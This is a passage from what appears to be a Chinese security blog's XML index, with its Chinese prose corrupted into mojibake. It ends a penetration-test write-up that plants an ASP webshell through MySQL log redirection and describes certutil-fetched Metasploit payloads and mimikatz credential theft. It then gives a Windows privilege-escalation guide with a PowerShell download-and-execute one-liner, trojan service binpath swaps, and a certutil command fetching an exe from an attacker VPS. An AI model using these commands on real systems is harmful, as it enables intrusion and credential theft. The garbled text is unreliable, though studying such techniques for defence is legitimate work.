file</code>ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æƒé™<br>å°è¯•ä½¿ç”¨æ—¥å¿—å†™å…¥ï¼Œå…ˆå¼€å¯æ—¥å¿—ï¼Œç„¶å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global  general_log_file &#x3D;&quot; D:\\wwwroot\\xxx.com\\web\\a.php&quot;</span><br></pre></td></tr></table></figure><p>å¥½åƒè¿˜æ˜¯ä¸è¡Œï¼Œæˆ‘è£‚å¼€äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/815342482.png"></p><p>çªç„¶æˆ‘æƒ³åˆ°ï¼Œæ—¢ç„¶è¿™ä¸ªwwwrootç›®å½•æ²¡æœ‰æƒé™ï¼Œé‚£ä¹ˆæŠ¤å«ç¥ä¸»æœºå¤§å¸ˆç®¡ç†é¡µé¢æ˜¯å¦å¯ä»¥åˆ©ç”¨ä¸€ä¸‹å‘¢ ï¼Œç¿»äº†ä¸€ä¸‹æœ¬åœ°å®‰è£…çš„ä¸»æœºå¤§å¸ˆæ–‡ä»¶ï¼Œå¯ä»¥ç¡®è®¤ä¸»æœºå¤§å¸ˆçš„ç®¡ç†é¡µé¢ç»å¯¹è·¯å¾„æ˜¯D:Hws.comHwsHostMasterhostweb</p><p>å°è¯•ä¿®æ”¹æ—¥å¿—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set global  general_log_file &#x3D;&quot; D:\\Hws.com\\HwsHostMaster\\host\\web\\1.asp&quot;</span><br></pre></td></tr></table></figure><p>æˆåŠŸã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2621937424.png"></p><p>ç„¶åæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select â€œ&lt;%eval request(&quot;chopper&quot;)%&gt;â€</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>http://xxx.xxx.xxx.xxx:6588/1.asp</code>æŠ¥é”™404ï¼Œè¿™ä¸ªé—®é¢˜éš¾äº†æˆ‘å¥½ä¹…ï¼Œåæ¥æˆ‘æ‰å‘ç°ï¼Œéœ€è¦æŠŠæ—¥å¿—æ–‡ä»¶æ¢æˆå…¶ä»–çš„ï¼Œå½“å‰æ—¥å¿—æ–‡ä»¶æ‰å¯ä»¥è®¿é—®ã€‚<br>Cknifeè¿æ¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2033555554.png"></p><p>Whoamiå‘ç°æ˜¯systemæƒé™ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œä¸ºäº†é˜²æ­¢æŠ¤å«ç¥æŸ¥æ€ï¼Œç”Ÿæˆäº†ä¸ªmsfå…æ€é©¬ï¼Œé€šè¿‡certutilä¸‹è½½ï¼Œç„¶åæ‰§è¡Œï¼Œmsfä¸Šçº¿ï¼Œç„¶åè¿ç§»è¿›ç¨‹ï¼Œload mimikatzï¼Œä¸€å¥—ä¸‹æ¥æ‹¿åˆ°äº†è¿œç¨‹è´¦å·å¯†ç ï¼Œè„±è£¤æ‰“åŒ…æºç ï¼Œæäº¤ç»™å®¢æˆ·ï¼Œå®Œäº‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windowsææƒçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†</title>
      <link href="2020/12/30/windows%E6%8F%90%E6%9D%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/"/>
      <url>2020/12/30/windows%E6%8F%90%E6%9D%83%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/</url>
      
        <content type="html"><![CDATA[<blockquote><p>freebufé“¾æ¥ï¼š<br><a href="https://www.freebuf.com/articles/terminal/259256.html">https://www.freebuf.com/articles/terminal/259256.html</a></p></blockquote><hr><h2 id="ç®€-ä»‹"><a href="#ç®€-ä»‹" class="headerlink" title="ç®€ ä»‹"></a>ç®€ ä»‹</h2><p>windowsåœ¨æ—¥å¸¸çš„æ¸—é€ä¸­ç»å¸¸é‡åˆ°ï¼Œè€Œåœ¨å†…ç½‘ä¹‹å‰ï¼Œç»å¸¸ä¼šåœ¨æ‰€æ‹¿åˆ°çš„è·³æ¿æœºè¿›è¡Œææƒï¼Œè¿™æ ·åé¢æ¨ªå‘ï¼Œå†…ç½‘æ‰èƒ½æ›´å¥½çš„å±•å¼€ï¼ˆæŠ“hashï¼Œå¿…é¡»å¾—ç³»ç»Ÿæˆ–ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œåšäº†ä¸€æ¬¡windowææƒæ€»ç»“ï¼Œå»ºè®®æ”¶è—ï¼Œåå¤çœ‹ï¼Œç†Ÿèƒ½ç”Ÿå·§ï¼</p><p>ææƒä»ç›®çš„å¯åˆ†ä¸ºçºµå‘ææƒä¸æ¨ªå‘ææƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">çºµå‘ææƒï¼šä½æƒé™è§’è‰²è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ã€‚ï¼ˆæœ€å¸¸è§çš„ï¼‰</span><br><span class="line"></span><br><span class="line">æ¨ªå‘ææƒï¼šè·å–åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚ï¼ˆæ ¹æ®å®é™…çš„éœ€æ±‚ï¼‰</span><br></pre></td></tr></table></figure><p>Windowså¸¸ç”¨çš„ææƒæ–¹æ³•æœ‰ï¼š<br>ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒã€æ•°æ®åº“ææƒã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒã€ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒã€çªƒå–ä»¤ç‰Œææƒã€bypassuacææƒï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶/æœåŠ¡ææƒï¼ŒWEBä¸­é—´ä»¶æ¼æ´ææƒç­‰ã€‚</p><p>ææƒæ€ç»´å¯¼å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1372713441.png"></p><h2 id="ææƒæ€è·¯"><a href="#ææƒæ€è·¯" class="headerlink" title="ææƒæ€è·¯"></a>ææƒæ€è·¯</h2><h3 id="1-ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"><a href="#1-ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ" class="headerlink" title="1.ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ"></a>1.ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</h3><p>ç®€ä»‹ï¼šæ­¤ææƒæ–¹æ³•æ˜¯åˆ©ç”¨ç³»ç»Ÿæœ¬èº«å­˜åœ¨çš„ä¸€äº›ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ï¼Œä½†æœªæ›¾æ‰“ç›¸åº”çš„è¡¥ä¸ï¼Œæ”»å‡»è€…é€šè¿‡å¯¹æ¯”systeminfoä¿¡æ¯ä¸­çš„è¡¥ä¸ä¿¡æ¯æ¥æŸ¥æ‰¾ç¼ºå¤±çš„è¡¥ä¸å·ï¼Œé€šè¿‡ç¼ºå¤±è¡¥ä¸å·å¯¹ç…§ç›¸åº”çš„ç³»ç»Ÿç‰ˆæœ¬æŸ¥æ‰¾å¯¹åº”å¯ä»¥ææƒæå‡çš„exp<br>æ³¨æ„ï¼Œåªè¦å¯¹åº”çš„è¡¥ä¸å·åŠ ä¸Šå¯¹åº”çš„ç³»ç»Ÿçš„ç‰ˆæœ¬çš„ææƒexpæ‰å¯ä»¥æˆåŠŸï¼Œæœ‰æ—¶å€™å¦‚æœæŸ¥æ‰¾åˆ°ææƒexpææƒä¸æˆåŠŸï¼Œé‚£ä¹ˆå°±å¯ä»¥æŸ¥çœ‹æ˜¯ä¸æ˜¯ç³»ç»Ÿç‰ˆæœ¬æ²¡å¯¹åº”ä¸Šï¼Œä¸”ä¸æ’é™¤ä¸€äº›ææƒæ¼æ´åˆ©ç”¨éœ€è¦ç›¸åº”çš„ç¯å¢ƒã€‚</p><p>æŸ¥æ‰¾è¡¥ä¸çš„æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#æ‰‹å·¥æŸ¥æ‰¾è¡¥ä¸æƒ…å†µ</span><br><span class="line">systeminfo</span><br><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#MSFåæ¸—é€æ‰«æ</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line">post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br><span class="line"></span><br><span class="line">#windows exploit suggester</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AonCyberLabs&#x2F;Windows-Exploit-Suggester</span><br><span class="line"></span><br><span class="line">#powershellä¸­çš„sherlockè„šæœ¬</span><br><span class="line">Import-Module C:\Sherlock.ps1 #ä¸‹è½½ps1è„šæœ¬ï¼Œå¯¼å…¥æ¨¡å—</span><br><span class="line">Find-AllVulns</span><br><span class="line"></span><br><span class="line">#Empireå†…ç½®æ¨¡å— Empireæ¡†æ¶ä¹Ÿæä¾›äº†å…³äºå†…æ ¸æº¢å‡ºæ¼æ´ææƒçš„æ¼æ´åˆ©ç”¨æ–¹æ³•</span><br><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">..........</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ°ç¼ºå¤±çš„è¡¥ä¸åï¼Œå¯¹ç…§ç›¸åº”çš„ç³»ç»Ÿç‰ˆæœ¬ï¼ŒæŸ¥æ‰¾å¯¹åº”çš„exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits</span><br><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Heptagrams&#x2F;Heptagram&#x2F;tree&#x2F;master&#x2F;Windows&#x2F;Elevation</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><h3 id="2-ç³»ç»Ÿé…ç½®é”™è¯¯ææƒ"><a href="#2-ç³»ç»Ÿé…ç½®é”™è¯¯ææƒ" class="headerlink" title="2.ç³»ç»Ÿé…ç½®é”™è¯¯ææƒ"></a>2.ç³»ç»Ÿé…ç½®é”™è¯¯ææƒ</h3><h4 id="2-1-é”™è¯¯æƒé™é…ç½®"><a href="#2-1-é”™è¯¯æƒé™é…ç½®" class="headerlink" title="2.1 é”™è¯¯æƒé™é…ç½®"></a>2.1 é”™è¯¯æƒé™é…ç½®</h4><p>ç®€ä»‹ï¼šwindowsç³»ç»ŸæœåŠ¡æ–‡ä»¶åœ¨æ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½å’Œè¿è¡Œï¼Œå¹¶åœ¨åå°è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç†è®ºä¸Šï¼Œä½æƒé™ç”¨æˆ·æ˜¯æ²¡æœ‰å¯¹é«˜æƒé™æœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶å†™æƒé™ï¼Œä½†æ˜¯ï¼Œå¦‚æœå› ç®¡ç†å‘˜é”™è¯¯çš„é…ç½®ï¼Œå¯¼è‡´ä¸€ä¸ªä½æƒé™çš„ç”¨æˆ·å¯¹æ­¤ç±»ç³»ç»ŸæœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ‹¥æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆä½æƒé™ç”¨æˆ·å°±å¯ä»¥å°†è¯¥æ–‡ä»¶æ›¿æ¢æˆä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥åŠ«æŒç³»ç»ŸæœåŠ¡ï¼Œè·å¾—è¯¥ç³»ç»ŸæœåŠ¡çš„æƒé™ï¼Œè€ŒwindowsæœåŠ¡æ˜¯ä»¥systemæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥ä½æƒé™ç”¨æˆ·å°±èƒ½è·å¾—ç³»ç»Ÿæƒé™ã€‚ï¼ˆåˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼‰<br>ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯åˆ©ç”¨æœ‰å¦‚ä¸‹ä¸¤ç§æ–¹å¼ï¼šæœåŠ¡æœªå¯åŠ¨ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»»æ„æœåŠ¡æ›¿æ¢åŸæ¥çš„æœåŠ¡ï¼Œç„¶åé‡å¯æœåŠ¡ æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•è¢«ç»ˆæ­¢ï¼šè¿™ç§æƒ…å†µç¬¦åˆç»å¤§å¤šæ•°çš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨dllåŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡æ¥ææƒ(éœ€è¦administrtoræƒé™)</p><p>æŸ¥æ‰¾é”™è¯¯é…ç½®çš„æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#powerupæä¾›äº†ä¸€äº›æœ¬åœ°ææƒçš„æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡å¾ˆå¤šå®ç”¨çš„è„šæœ¬æ¥å¯»æ‰¾ç›®æ ‡æœºå™¨çš„windowsæœåŠ¡æ¼æ´</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;tree&#x2F;master&#x2F;PowerUp</span><br><span class="line">å¯ç›´æ¥é€šè¿‡powershellè¿œç¨‹åŠ è½½</span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;master&#x2F;PowerUp&#x2F;PowerUp.ps1&#39;); Invoke-AllChecks&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#msf å¯¹åº”çš„æ¨¡å—ä¸ºexploit&#x2F;windows&#x2F;local&#x2F;service_permissions  ä½†å‰ææ˜¯è·å¾—ä¸€ä¸ªä¼šè¯</span><br><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions #è‡ªåŠ¨åŒ–ææƒï¼Œå›æ¥çš„çš„æƒé™å°±æ˜¯system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#å½“å·¥å…·æ— æ³•ä½¿ç”¨æ—¶ï¼Œä¹Ÿå¯ä»¥æ‰‹å·¥æŸ¥æ‰¾ï¼Œä½¿ç”¨Windowså†…å»ºå·¥å…·icaclsæŸ¥çœ‹æœåŠ¡å¯åŠ¨è·¯å¾„ä¸­å†™æƒé™</span><br><span class="line">ä¾‹å¦‚ï¼šicacls â€œC:\Program Filesâ€</span><br><span class="line">icacls â€œC:\Program Files\Common Filesâ€</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µ</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br><span class="line">å‚æ•°è¯´æ˜ï¼šâ€œMâ€è¡¨ç¤ºä¿®æ”¹ï¼Œâ€œFâ€ä»£è¡¨å®Œå…¨æ§åˆ¶ï¼Œâ€œCIâ€ä»£è¡¨ä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ï¼Œâ€œOIâ€ä»£è¡¨ä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ã€‚</span><br><span class="line"></span><br><span class="line">#æ£€æŸ¥æœåŠ¡ å¦‚æœæ˜¯.SERVICE_ALL_ACCESSçš„æ„æ€æ˜¯æˆ‘ä»¬å¯¹â€œVulnerable Serviceâ€çš„å±æ€§æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒ</span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteula</span><br><span class="line">sc qc æœåŠ¡å   #æŸ¥çœ‹å¯ä»¥å®Œå…¨æ§åˆ¶çš„æœåŠ¡çš„å±æ€§ã€‚</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#æŠŠæœåŠ¡å¯åŠ¨çš„è¡Œä¸ºï¼ˆexeæˆ–è€…è„šæœ¬ï¼Œcomç»„ä»¶..ï¼‰æ›¿æ¢æˆæˆ‘ä»¬çš„MSFåå¼¹æœ¨é©¬ï¼Œå½“æœåŠ¡é‡å¯æ—¶ï¼Œå°±ä¼šç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªsystemæƒé™çš„meterpreter</span><br><span class="line">set AutoRunScript migrate -f#æ­£å¸¸æ¥æ”¶åˆ°ä¼šè¯åï¼Œä¸ä¹…å°±ä¼šè‡ªåŠ¨æ–­å¼€è¿æ¥ï¼Œéœ€è¦å¼€å¯å‘½ä»¤è‡ªåŠ¨è¿ç§»è¿›ç¨‹</span><br><span class="line">ä¸ºä»€ä¹ˆè¦è‡ªåŠ¨è¿ç§»ï¼Ÿ</span><br><span class="line">è¿™æ˜¯å› ä¸ºå½“ä¸€ä¸ªæœåŠ¡åœ¨Windowsç³»ç»Ÿä¸­å¯åŠ¨åï¼Œå®ƒå¿…é¡»å’ŒæœåŠ¡æ§åˆ¶ç®¡ç†å™¨é€šä¿¡ï¼Œå¦‚æœæ²¡æœ‰é€šä¿¡ï¼ŒæœåŠ¡æ§åˆ¶ç®¡ç†å™¨ä¼šè®¤ä¸ºå‡ºç°äº†é”™è¯¯ï¼Œå¹¶ä¼šç»ˆæ­¢è¿™ä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬æ‰€æœ‰éœ€è¦åšçš„å°±æ˜¯åœ¨ç»ˆæ­¢è½½è·è¿›ç¨‹ä¹‹å‰ï¼Œå°†å®ƒè¿ç§»åˆ°å…¶å®ƒè¿›ç¨‹ã€‚</span><br><span class="line"></span><br><span class="line">#run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br><span class="line"></span><br><span class="line">#æ‰¾åˆ°æˆ‘ä»¬å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„æœåŠ¡ï¼Œä¿®æ”¹æœåŠ¡é…ç½®æ‰§è¡Œå‘½ä»¤</span><br><span class="line">sc config æœåŠ¡å binpath &#x3D; &quot;æœ¨é©¬ç¨‹åº.exe&quot;   #INARY_PATH_NAMEå‚æ•°æŒ‡å‘äº†è¯¥æœåŠ¡çš„å¯æ‰§è¡Œç¨‹åº</span><br><span class="line">sc stop æœåŠ¡å</span><br><span class="line">sc start æœåŠ¡å</span><br><span class="line"></span><br><span class="line">è¿™é‡Œå¯ä»¥ç”¨æœ¨é©¬ç¨‹åºå¯ä»¥ç”¨exeï¼Œä»»æ„è„šæœ¬ï¼Œdllæ–‡ä»¶ç­‰ç­‰ï¼Œå…·ä½“æƒ…å†µå…·ä½“åˆ†æ</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æŠŠè®¡åˆ’ä»»åŠ¡ç›®å½•å¯å†™ä¹Ÿæ”¾åœ¨è¿™é‡Œï¼Œå› ä¸ºè®¡åˆ’ä»»åŠ¡ä¹Ÿç®—ç³»ç»ŸæœåŠ¡åŠŸèƒ½ã€‚<br>ç®€ä»‹ï¼šwindowsæ“ä½œç³»ç»Ÿæä¾›äº†ä¸€ä¸ªå®ç”¨ç¨‹åºï¼ˆschtasks.exeï¼‰,ä½¿ç³»ç»Ÿç®¡ç†å‘˜èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ—¶é—´æ‰§è¡Œç¨‹åºæˆ–è„šæœ¬ï¼ˆåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè®¡åˆ’ä»»åŠ¡æ˜¯ä»¥NT AuthoritySystemé«˜æƒé™æ‰§è¡Œçš„ï¼‰ï¼Œå¦‚æœåœ°æƒé™ç”¨æˆ·å¯¹è®¡åˆ’ä»»åŠ¡æ‰€åœ¨ç›®å½•æœ‰è¯»å†™æƒé™ï¼Œå®Œå…¨å¯ä»¥æ›¿æ¢è®¡åˆ’ä»»åŠ¡æ‰€æ‰§è¡Œçš„è„šæœ¬æˆ–ç¨‹åºï¼Œè·å¾—é«˜æƒé™ï¼ˆä½†éœ€è¦é”™è¯¯é…ç½®ï¼Œè®©æ­¤ç›®å½•ä¸‹å…¶ä»–ç”¨æˆ·å¯å†™ï¼‰ã€‚<br>å®˜æ–¹è¯´æ˜æ–‡æ¡£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;windows&#x2F;desktop&#x2F;aa446802(v&#x3D;vs.85).aspx</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾é”™è¯¯é…ç½®çš„æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#schtask æŸ¥è¯¢</span><br><span class="line">schtasks &#x2F;query &#x2F;fo LIST 2&gt;nul</span><br><span class="line"></span><br><span class="line">#powershell</span><br><span class="line">Get-ScheduledTask</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#è¿›è¡Œç­›é€‰ åˆ é™¤åŒ…å«&#x2F;Microsoft&#x2F;Windows&#x2F;è·¯å¾„çš„æ‰€æœ‰ä»»åŠ¡</span><br><span class="line">Get-ScheduledTask | Select * | ? &#123;($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)&#125; | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @&#123;Name&#x3D;&quot;User&quot;;Expression&#x3D;&#123;$_.Principal.userID&#125;&#125;</span><br><span class="line"></span><br><span class="line">#åˆ†æè®¡åˆ’ä»»åŠ¡  æŸ¥æ‰¾è¡Œä¸ºï¼Œæ¯”å¦‚exeï¼Œè„šæœ¬ä»€ä¹ˆçš„</span><br><span class="line">$task&#x3D; Get-ScheduledTask -TaskName è®¡åˆ’ä»»åŠ¡å </span><br><span class="line">ForEach ($triger in $task.Triggers) &#123; echo $triger.Repetition.Interval&#125;</span><br><span class="line"></span><br><span class="line">#æŸ¥æ‰¾è®¡åˆ’ä»»åŠ¡è¡Œä¸ºæ‰€åœ¨ç›®å½•ï¼Œä½æƒé™ç”¨æˆ·æ˜¯å¦å…·æœ‰å¯å†™æƒé™  accesschk.exe  å½“ç„¶ä¹Ÿå¯ä»¥ç”¨icaclså‘½ä»¤</span><br><span class="line">accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\1111.exe</span><br><span class="line"></span><br><span class="line">#ç›´æ¥æ›¿æ¢</span><br><span class="line">certutil -urlcache -split -f &quot;http:&#x2F;&#x2F;ä½ çš„vps&#x2F;1111.exe&quot; C:\ScheduledTasks\Task1\1111.exe</span><br><span class="line"></span><br><span class="line">#ç­‰å¾…è®¡åˆ’ä»»åŠ¡æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h4 id="2-2å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"><a href="#2-2å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´" class="headerlink" title="2.2å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"></a>2.2å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</h4><p>ç®€ä»‹ï¼šå¦‚æœä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ä¸”åŒ…å«ç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æ˜¯æœ‰æ¼æ´çš„ã€‚</p><p>åŸç†ï¼šå¯¹äºC:Program FilesSome FolderService.exeæ–‡ä»¶è·¯å¾„ä¸­çš„æ¯ä¸€ä¸ªç©ºæ ¼ï¼Œwindowséƒ½ä¼šå°è¯•å¯»æ‰¾å¹¶æ‰§è¡Œåå­—ä¸ç©ºæ ¼å‰çš„åå­—å‘åŒ¹é…çš„ç¨‹åºã€‚æ“ä½œç³»ç»Ÿä¼šå¯¹æ–‡ä»¶è·¯å¾„ä¸­ç©ºæ ¼çš„æ‰€æœ‰å¯èƒ½è¿›è¡Œå°è¯•ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„ç¨‹åºã€‚ä»¥ä¸Šé¢çš„ä¾‹å­ä¸ºä¾‹ï¼Œwindowsä¼šä¾æ¬¡å°è¯•ç¡®å®šå’Œæ‰§è¡Œä¸‹é¢çš„ç¨‹åºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¸Šä¼ ä¸€ä¸ªé€‚å½“å‘½åçš„æ¶æ„å¯æ‰§è¡Œç¨‹åºåœ¨å—å½±å“çš„ç›®å½•ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘æŠŠæœ¨é©¬åå­—æ”¹äº†Program.exeï¼Œæ”¾åœ¨cç›˜å°,ä¸€æ—¦æ­¤æœåŠ¡é‡å¯ï¼Œå› ä¸ºä¼˜å…ˆçº§çš„ç¼˜æ•…ï¼ŒæœåŠ¡ä¼šä¼˜å…ˆé€‰æ‹©æˆ‘ä»¬æœ¨é©¬Program.exeï¼Œè€Œä¸æ˜¯C:Program FilesSome FolderService.exeï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ¶æ„ç¨‹åºå°±ä¼šä»¥systemæƒé™è¿è¡Œ(å¤§å¤šæ•°æƒ…å†µä¸‹)ã€‚</p><p>æŸ¥æ‰¾é”™è¯¯é…ç½®çš„æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 